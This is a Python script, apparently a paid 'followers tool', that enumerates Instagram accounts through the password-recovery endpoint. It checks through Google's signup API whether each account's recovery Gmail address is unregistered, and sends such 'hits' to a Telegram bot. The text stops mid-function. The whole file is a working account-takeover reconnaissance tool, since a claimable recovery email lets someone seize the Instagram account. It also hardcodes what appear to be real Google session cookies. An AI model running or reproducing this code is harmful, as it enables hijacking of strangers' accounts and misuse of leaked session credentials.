import requests
import random
import uuid
import time
import os
import sys
from uuid import uuid4
import threading 
from threading import Thread
import string
import json
import re

PASSWORD = "lakhan@123"

def require_password(attempts=1, delay=1):
    for i in range(attempts):
        inp = input("PAHLE PASSWORD LAGEGA: ")
        if inp == PASSWORD:
            return True
        else:
            print("Galat PASSWORD HE PAHLE PASS LO.")
            time.sleep(delay)
    print("Access denied.")
    sys.exit(1)

if __name__ == "__main__":
    require_password()

yellow = "\033[93m"  # yellow color

def print_slowly(text, delay=0.1):
   for char in text:
       print(char, end='', flush=True)
       time.sleep(delay)
   print()

print_slowly(f"{yellow}FOLLOWERS TOOL BY | @LAKHAN_SHARMA")
import datetime
import pytz
end_datetime = datetime.datetime(2025, 11, 20)  
iraq_timezone = pytz.timezone("Asia/Baghdad")

remaining_time = end_datetime.astimezone(iraq_timezone) - datetime.datetime.now(iraq_timezone)
print_slowly(f" The Remaining Time : {remaining_time}")

if datetime.datetime.now(iraq_timezone) >= end_datetime.astimezone(iraq_timezone):
    print("[!] The Specified Time Has Expired")
    exit(0)
    
g = 0
b = 0
ge = 0
be = 0
t = input("Enter Chat ID => ")
m = input("Enter Token => ")
def yup():
    os.system('clear')
    sys.stdout.write(
        f"𝗚𝗢𝗢𝗗 𝗜𝗚     {g}\n"
        f"𝗕𝗔𝗗 𝗜𝗚      {b}\n"
        f"𝗕𝗔𝗗 𝗘𝗠𝗔𝗜𝗟   {be}\n"
        f"𝗛𝗜𝗧𝗦      {ge}\n"
    )
    sys.stdout.flush()
def reset(x):
    global g,b
    url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
    payload = {
        'signed_body': 'SIGNATURE.{"adid":"8d9f1234-6a5b-47f8-8f8c-0e91b2b3f12d","guid":"a8712b13-c9f1-4e3b-9349-0d82e9b32e21","device_id":"android-3c2b7f8c9d10e2a1","query":"'+x+'","waterfall_id":"51abf4d2-9c35-48f7-9bda-6a7213e4c98f"}'
    }
    headers = {
        'User-Agent': "Instagram 311.0.0.32.118 Android (25/7.1.2; 420dpi; 1920x1080; Samsung; SM-G950F; dreamlte; exynos8895; en_US; 545986883)",
        'Accept-Encoding': "zstd",
        'accept-language': "en-US",
        'ig-intended-user-id': "0",
        'priority': "u=3",
        'x-bloks-is-layout-rtl': "false",
        'x-bloks-is-prism-enabled': "true",
        'x-bloks-prism-button-version': "0",
        'x-bloks-version-id': "9e0c1a34b9a84d57a2c4122bb7e74e14e3e95b7e6c88b27c35e3213df52a9a12",
        'x-fb-client-ip': "True",
        'x-fb-connection-type': "WIFI",
        'x-fb-friendly-name': "IgApi: accounts/send_recovery_flow_email/",
        'x-fb-request-analytics-tags': '{"network_tags":{"product":"567067343352427","purpose":"fetch","surface":"undefined","request_category":"api","retry_attempt":"0"}}',
        'x-fb-server-cluster': "True",
        'x-ig-android-id': "android-3c2b7f8c9d10e2a1",
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_US",
        'x-ig-bandwidth-speed-kbps': "612.000",
        'x-ig-bandwidth-totalbytes-b': "845231",
        'x-ig-bandwidth-totaltime-ms': "1090",
        'x-ig-client-endpoint': "user_password_recovery",
        'x-ig-capabilities': "3brTv10=",
        'x-ig-connection-type': "WIFI",
        'x-ig-device-id': "a8712b13-c9f1-4e3b-9349-0d82e9b32e21",
        'x-ig-device-locale': "en_US",
        'x-ig-family-device-id': "b1d4f7a8-7c2e-4a1f-b962-99a3f8d9e20a",
        'x-ig-mapped-locale': "en_US",
        'x-ig-nav-chain': "SelfFragment:self_profile:3:main_profile:1763034443.642::,ProfileMediaTabFragment:self_profile:4:button:1763034448.992::,AccountSwitchFragment:account_switch_fragment:5:button:1763034455.744::,AddAccountBottomSheetFragment:add_account_bottom_sheet:6:button:1763034463.877::,LoginLandingFragment:login_landing:7:button:1763034468.309::,LoginLandingFragment:login_landing:8:warm_start:1763034478.161::,LookupFragment:password_lookup:9:button:1763034480.762::,UserPasswordRecoveryFragment:user_password_recovery:10:button:1763034528.270::",
        'x-ig-timezone-offset': "19800",
        'x-ig-www-claim': "0",
        'x-mid': "bQxkZgABAAEuJ9dP93H7wK1CZZLp",
        'x-pigeon-rawclienttime': "1763034570.441",
        'x-pigeon-session-id': "UFS-95be7fc1-74f0-4ac2-9b2a-13f92a0cf003-5",
        'x-tigon-is-retry': "False",
        'x-fb-http-engine': "MNS",
        'x-fb-rmd': "state=URL_ELIGIBLE"
    }
    response = requests.post(url, data=payload, headers=headers)
    try:
        j = response.json()
        e = j.get('email', None)
        if e:
            if x == e:
                g+=1
                yup()
                cxqok(x)
            else:
                b+=1
                yup()
        else:
            b+=1
            yup()
    except:
        b+=1
        yup()
def xax(y):
    headers = {
        'User-Agent': 'Instagram 311.0.0.32.118 Android (25/7.1.2; 450dpi; 2048x2048; Google; Pixel; sailfish; en_US; 545986883)',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Language': 'en-US',
        'X-IG-Android-ID': 'android-5b7ed0786fa2ec6f',
        'X-IG-App-ID': '567067343352427',
        'X-IG-Capabilities': '3brTv10=',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Device-ID': '79147ef2-d663-4f58-9442-5ad27fe4bbb4',
        'X-IG-Timezone-Offset': '19800',
        'X-FB-HTTP-Engine': 'MNS'
    }
    payload = {
        "adid": "ece40bb6-21cf-4071-934d-11ad4cc952ab",
        "guid": "79147ef2-d663-4f58-9442-5ad27fe4bbb4",
        "device_id": "android-5b7ed0786fa2ec6f",        "query": y,
        "waterfall_id": "a0ea3580-7786-49c7-b8fb-daa4513917eb"
    }
    data = {
        'signed_body': f'SIGNATURE.{json.dumps(payload)}'
    }
    response = requests.post(
        'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
        headers=headers,
        data=data
    )
    try:
    	j = response.json()
    	dec = j.get('email', {})
    except:
    	pass
    return dec
def prime():
	while True:
		url = "https://accounts.google.com/_/signup/validatepersonaldetails?hl=en-GB&_reqid=60565&rt=j"
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': "[\"AEThLlwciZkZW8nQx3tPkBLhuLTzuKUSE15wYzp5cY68152lG8Hs6Ofbuc9Imuez39vapK2eeRC3\",null,null,null,null,0,0,\"Prime\",\"Prime\",null,0,null,1,[],1]",
		  'azt': "AFoagUXsupNkZKe9LpbTm01WEVckl_KqDg:1763032750603",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:560",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'x-same-domain': "1",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-arch': "\"\"",
		  'sec-ch-ua-full-version': "\"124.0.6327.4\"",
		  'sec-ch-ua-platform-version': "\"14.0.0\"",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
		  'sec-ch-ua-bitness': "\"\"",
		  'sec-ch-ua-model': "\"SM-A235F\"",
		  'sec-ch-ua-wow64': "?0",
		  'sec-ch-ua-platform': "\"Android\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CNv/ygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "OTZ=8324900_34_34__34_; SID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWp2VhtJrqULiUWbh4F5p1pQACgYKAZ0SARcSFQHGX2MiosKs80Ki8vVng6fO87i3dRoVAUF8yKq6sW-2iBwaPEmSW4zT7-u90076; __Secure-1PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkbqcgrt80KolBkjK3_1STAACgYKAe8SARcSFQHGX2MihAoJGi5jCxxhdb5W6WopMhoVAUF8yKoub2iEsGYAgoj6r7tp4QkE0076; __Secure-3PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkPywS57gjVE4o6fe6_5irgACgYKAXASARcSFQHGX2Miyj6EHbEItRVIOP76ijMRDxoVAUF8yKo0gJ3sduTvKUY4njSYQdpi0076; HSID=Am_2Ay_faDqTECJT8; SSID=A5UhpN4T2oDJwIwZI; APISID=qx4TV0KnHj0wtO2v/Ah8NAkMC5nV9U1W2t; SAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-1PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-3PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; ACCOUNT_CHOOSER=AFx_qI6YdEtZKNaKoAynqsJbeR5qfz7LGLm1z7hHsCkdEzMF2S4dCjnI7i6wbatEZl-4qqncCv1ryBnMUZgHzF8-G-SchyGyDkYsHmfepuBqwUWxO-xOSVlrXU9TTEuAw9VcNKVi-vmf; LSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxYM0gDvq4uoHOAgCKmTv7sQACgYKATYSARcSFQHGX2MiL-RByG4wdpXZ-VJELHvNuxoVAUF8yKpsgylirve6kLatoyhVb5UQ0076; __Host-1PLSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxG5Peh-xayd65ak4YY3E9ZwACgYKATYSARcSFQHGX2MiSdN6F-d9tjVMjPSuXUIUhhoVAUF8yKoUHTPlSzX_FbmPM-Cct7EI0076; SEARCH_SAMESITE=CgQIp58B; __Host-3PLSID=o.myaccount.google.com|s.youtube:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxw8D91beunTQR5gr9nVJ6LwACgYKASMSARcSFQHGX2Mif3ocCh0nOVjc9SnmhcRNvBoVAUF8yKpNGj1Uot49dLDWB2-Vt2yl0076; AEC=AaJma5vv1dAWIJNrBue8FOxDA4JcHWS_E3GwX27Lk0V4m34TcKfQvuwebQ; NID=526=Nkj-L88o5bMjs3hddjtKdS7gtglfW3e8222S_sgKaFXKdQsNFW7W5erRCd5GY5lzrf3wQWTl5aM8hOGcw9a-cZIVLuQFl4VEBH104zVfmr2K8SxiYJ1-crJPdLKILI9N_iQ_BCIMo_dVM8CdRRUwJPI1txzMW9aWBj0vv7eJmv03GWD94KhyXGgCHk0kRRTLE1_BGJ2h-EfKGL4LoQHvPIDJTmDC-q4VDP6m4UNrG-rmI35VdaCgOmZeXJ0ghDvQi_FTXBYnW0A4EWq07Xkz7F_JfO9rdOcsQmcEVt8-gCUMOHqd2Wldy8pkQRIcDwdUSvncQtM6ovjlw0xrmt-SfVvlfw_1TSI0X5VmnYBYbpC0OvaClO1oOCqhyIlQThDK; __Host-GAPS=1:0ClRSwJ-CI86IW66UhVDE6NcvVitRt9C2dNneq855jQceIbVpfOnA2u_8CBVtI3O8nUKD7TxznkaTpOznnkb7BLOkvL-hQ:fbk1NuTVP-Ieh6r6; SIDCC=AKEyXzWc3YFHE1McpN1x3dJgrrBx_KLoDE43B_fk9pG231gGxuyvk6gtcaHYWFsUVNaJdNsqGKQ; __Secure-1PSIDCC=AKEyXzWD5oz8L1IhyEQYOzYKrEHQycBMMFDr8ORz594BRmLgy41gp8MI6t0lCnsWC14fMRl7uxw; __Secure-3PSIDCC=AKEyXzVXbzSpPcsMn-7fhgF37nGdDdMwZwGGsVAUMzl7Ligcrocd77lMGR7RsmZAyHZNPujc5Ck"
		}
		response = requests.post(url, data=payload, headers=headers)
		qq = response.text
		tl = qq.split('"gf.ttu",null,"')[1].split('"')[0]
		url = "https://accounts.google.com/_/signup/validatebasicinfo?hl=en-GB&TL="+tl+"&_reqid=260565&rt=j"
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': "[\"TL:"+tl+"\",2015,10,12,2,null,null,0,null,null,0,0]",
		  'azt': "AFoagUXsupNkZKe9LpbTm01WEVckl_KqDg:1763032750603",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:560",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'x-same-domain': "1",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-arch': "\"\"",
		  'sec-ch-ua-full-version': "\"124.0.6327.4\"",
		  'sec-ch-ua-platform-version': "\"14.0.0\"",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
		  'sec-ch-ua-bitness': "\"\"",
		  'sec-ch-ua-model': "\"SM-A235F\"",
		  'sec-ch-ua-wow64': "?0",
		  'sec-ch-ua-platform': "\"Android\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CNv/ygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+tl+"",
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "OTZ=8324900_34_34__34_; SID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWp2VhtJrqULiUWbh4F5p1pQACgYKAZ0SARcSFQHGX2MiosKs80Ki8vVng6fO87i3dRoVAUF8yKq6sW-2iBwaPEmSW4zT7-u90076; __Secure-1PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkbqcgrt80KolBkjK3_1STAACgYKAe8SARcSFQHGX2MihAoJGi5jCxxhdb5W6WopMhoVAUF8yKoub2iEsGYAgoj6r7tp4QkE0076; __Secure-3PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkPywS57gjVE4o6fe6_5irgACgYKAXASARcSFQHGX2Miyj6EHbEItRVIOP76ijMRDxoVAUF8yKo0gJ3sduTvKUY4njSYQdpi0076; HSID=Am_2Ay_faDqTECJT8; SSID=A5UhpN4T2oDJwIwZI; APISID=qx4TV0KnHj0wtO2v/Ah8NAkMC5nV9U1W2t; SAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-1PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-3PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; ACCOUNT_CHOOSER=AFx_qI6YdEtZKNaKoAynqsJbeR5qfz7LGLm1z7hHsCkdEzMF2S4dCjnI7i6wbatEZl-4qqncCv1ryBnMUZgHzF8-G-SchyGyDkYsHmfepuBqwUWxO-xOSVlrXU9TTEuAw9VcNKVi-vmf; LSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxYM0gDvq4uoHOAgCKmTv7sQACgYKATYSARcSFQHGX2MiL-RByG4wdpXZ-VJELHvNuxoVAUF8yKpsgylirve6kLatoyhVb5UQ0076; __Host-1PLSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxG5Peh-xayd65ak4YY3E9ZwACgYKATYSARcSFQHGX2MiSdN6F-d9tjVMjPSuXUIUhhoVAUF8yKoUHTPlSzX_FbmPM-Cct7EI0076; SEARCH_SAMESITE=CgQIp58B; __Host-3PLSID=o.myaccount.google.com|s.youtube:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxw8D91beunTQR5gr9nVJ6LwACgYKASMSARcSFQHGX2Mif3ocCh0nOVjc9SnmhcRNvBoVAUF8yKpNGj1Uot49dLDWB2-Vt2yl0076; AEC=AaJma5vv1dAWIJNrBue8FOxDA4JcHWS_E3GwX27Lk0V4m34TcKfQvuwebQ; NID=526=Nkj-L88o5bMjs3hddjtKdS7gtglfW3e8222S_sgKaFXKdQsNFW7W5erRCd5GY5lzrf3wQWTl5aM8hOGcw9a-cZIVLuQFl4VEBH104zVfmr2K8SxiYJ1-crJPdLKILI9N_iQ_BCIMo_dVM8CdRRUwJPI1txzMW9aWBj0vv7eJmv03GWD94KhyXGgCHk0kRRTLE1_BGJ2h-EfKGL4LoQHvPIDJTmDC-q4VDP6m4UNrG-rmI35VdaCgOmZeXJ0ghDvQi_FTXBYnW0A4EWq07Xkz7F_JfO9rdOcsQmcEVt8-gCUMOHqd2Wldy8pkQRIcDwdUSvncQtM6ovjlw0xrmt-SfVvlfw_1TSI0X5VmnYBYbpC0OvaClO1oOCqhyIlQThDK; __Host-GAPS=1:0ClRSwJ-CI86IW66UhVDE6NcvVitRt9C2dNneq855jQceIbVpfOnA2u_8CBVtI3O8nUKD7TxznkaTpOznnkb7BLOkvL-hQ:fbk1NuTVP-Ieh6r6; SIDCC=AKEyXzWc3YFHE1McpN1x3dJgrrBx_KLoDE43B_fk9pG231gGxuyvk6gtcaHYWFsUVNaJdNsqGKQ; __Secure-1PSIDCC=AKEyXzWD5oz8L1IhyEQYOzYKrEHQycBMMFDr8ORz594BRmLgy41gp8MI6t0lCnsWC14fMRl7uxw; __Secure-3PSIDCC=AKEyXzVXbzSpPcsMn-7fhgF37nGdDdMwZwGGsVAUMzl7Ligcrocd77lMGR7RsmZAyHZNPujc5Ck"
		}
		response = requests.post(url, data=payload, headers=headers)
		ww = response.text
		tll = json.loads(re.sub(r'^\)\]\}\'\n?', '', ww))[0][0][4].strip().replace('TL:', '', 1)
		with open("tok.txt", "w") as PrimeIsOpBakiSabLamdeKiTopi:
			PrimeIsOpBakiSabLamdeKiTopi.write(tll) #(@aesowns)
def cxqok(k):
	global ge,be
	c = k.split("@")[0]
	with open("tok.txt", "r") as ok:
		TL = ok.read().strip()
	url = "https://accounts.google.com/_/signup/usernameavailability?hl=en-GB&TL="+TL+"&_reqid=360565&rt=j"
	payload = {
	  'continue': "https://accounts.google.com/ManageAccount?nc=1",
	  'f.req': "[\"TL:"+TL+"\",\""+c+"\",1,0,1,null,0,5444]",
	  'azt': "AFoagUXsupNkZKe9LpbTm01WEVckl_KqDg:1763032750603",
	  'cookiesDisabled': "false",
	  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
	  'gmscoreversion': "null",
	  'flowName': "GlifWebSignIn",
	  'checkConnection': "youtube:560",
	  'checkedDomains': "youtube",
	  'pstMsg': "1",
	  '': ""
	}
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
	  'x-same-domain': "1",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-arch': "\"\"",
	  'sec-ch-ua-full-version': "\"124.0.6327.4\"",
	  'sec-ch-ua-platform-version': "\"14.0.0\"",
	  'google-accounts-xsrf': "1",
	  'sec-ch-ua-full-version-list': "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
	  'sec-ch-ua-bitness': "\"\"",
	  'sec-ch-ua-model': "\"SM-A235F\"",
	  'sec-ch-ua-wow64': "?0",
	  'sec-ch-ua-platform': "\"Android\"",
	  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
	  'origin': "https://accounts.google.com",
	  'x-client-data': "CNv/ygE=",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+TL+"",
	  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
	  'Cookie': "OTZ=8324900_34_34__34_; SID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWp2VhtJrqULiUWbh4F5p1pQACgYKAZ0SARcSFQHGX2MiosKs80Ki8vVng6fO87i3dRoVAUF8yKq6sW-2iBwaPEmSW4zT7-u90076; __Secure-1PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkbqcgrt80KolBkjK3_1STAACgYKAe8SARcSFQHGX2MihAoJGi5jCxxhdb5W6WopMhoVAUF8yKoub2iEsGYAgoj6r7tp4QkE0076; __Secure-3PSID=g.a0002wi1dZx2MbTUd5GTjzS1rX_25INZnC1R4ZiyBGGoGAb2eatWkPywS57gjVE4o6fe6_5irgACgYKAXASARcSFQHGX2Miyj6EHbEItRVIOP76ijMRDxoVAUF8yKo0gJ3sduTvKUY4njSYQdpi0076; HSID=Am_2Ay_faDqTECJT8; SSID=A5UhpN4T2oDJwIwZI; APISID=qx4TV0KnHj0wtO2v/Ah8NAkMC5nV9U1W2t; SAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-1PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; __Secure-3PAPISID=wU0NgErCd483VhT1/AWjzXdFirg1i8ZoAm; ACCOUNT_CHOOSER=AFx_qI6YdEtZKNaKoAynqsJbeR5qfz7LGLm1z7hHsCkdEzMF2S4dCjnI7i6wbatEZl-4qqncCv1ryBnMUZgHzF8-G-SchyGyDkYsHmfepuBqwUWxO-xOSVlrXU9TTEuAw9VcNKVi-vmf; LSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxYM0gDvq4uoHOAgCKmTv7sQACgYKATYSARcSFQHGX2MiL-RByG4wdpXZ-VJELHvNuxoVAUF8yKpsgylirve6kLatoyhVb5UQ0076; __Host-1PLSID=o.myaccount.google.com:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxG5Peh-xayd65ak4YY3E9ZwACgYKATYSARcSFQHGX2MiSdN6F-d9tjVMjPSuXUIUhhoVAUF8yKoUHTPlSzX_FbmPM-Cct7EI0076; SEARCH_SAMESITE=CgQIp58B; __Host-3PLSID=o.myaccount.google.com|s.youtube:g.a0002wi1ddzSqkfVTX1dOHBBIj20JEbdS1A0kXfdpirvnbisVmpxw8D91beunTQR5gr9nVJ6LwACgYKASMSARcSFQHGX2Mif3ocCh0nOVjc9SnmhcRNvBoVAUF8yKpNGj1Uot49dLDWB2-Vt2yl0076; AEC=AaJma5vv1dAWIJNrBue8FOxDA4JcHWS_E3GwX27Lk0V4m34TcKfQvuwebQ; NID=526=Nkj-L88o5bMjs3hddjtKdS7gtglfW3e8222S_sgKaFXKdQsNFW7W5erRCd5GY5lzrf3wQWTl5aM8hOGcw9a-cZIVLuQFl4VEBH104zVfmr2K8SxiYJ1-crJPdLKILI9N_iQ_BCIMo_dVM8CdRRUwJPI1txzMW9aWBj0vv7eJmv03GWD94KhyXGgCHk0kRRTLE1_BGJ2h-EfKGL4LoQHvPIDJTmDC-q4VDP6m4UNrG-rmI35VdaCgOmZeXJ0ghDvQi_FTXBYnW0A4EWq07Xkz7F_JfO9rdOcsQmcEVt8-gCUMOHqd2Wldy8pkQRIcDwdUSvncQtM6ovjlw0xrmt-SfVvlfw_1TSI0X5VmnYBYbpC0OvaClO1oOCqhyIlQThDK; __Host-GAPS=1:0ClRSwJ-CI86IW66UhVDE6NcvVitRt9C2dNneq855jQceIbVpfOnA2u_8CBVtI3O8nUKD7TxznkaTpOznnkb7BLOkvL-hQ:fbk1NuTVP-Ieh6r6; SIDCC=AKEyXzWc3YFHE1McpN1x3dJgrrBx_KLoDE43B_fk9pG231gGxuyvk6gtcaHYWFsUVNaJdNsqGKQ; __Secure-1PSIDCC=AKEyXzWD5oz8L1IhyEQYOzYKrEHQycBMMFDr8ORz594BRmLgy41gp8MI6t0lCnsWC14fMRl7uxw; __Secure-3PSIDCC=AKEyXzVXbzSpPcsMn-7fhgF37nGdDdMwZwGGsVAUMzl7Ligcrocd77lMGR7RsmZAyHZNPujc5Ck"
	}
	response = requests.post(url, data=payload, headers=headers)
	try:
	   	thike = response.text
	   	if '"gf.uar",1' in thike:
	   		ge+=1
	   		yup()
	   		dec = xax(c)
	   		tg(t,m,k,c,dec)
	   	else:
	   		be+=1
	   		yup()
	except:
	   	be+=1
	   	yup()
def tg(t,m,k,c,dec):
	global ge
	if dec:
		z = dec
	else:
		z = 'ma cud gyi hit ki'
	headers = {
	'authority': 'www.instagram.com',
	'accept': '*/*',
	'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
	'content-type': 'application/x-www-form-urlencoded',
	'origin': 'https://www.instagram.com',
	'sec-ch-prefers-color-scheme': 'dark',
	'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-model': '""',
	'sec-ch-ua-platform': '"Linux"',
	'sec-ch-ua-platform-version': '""',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'c
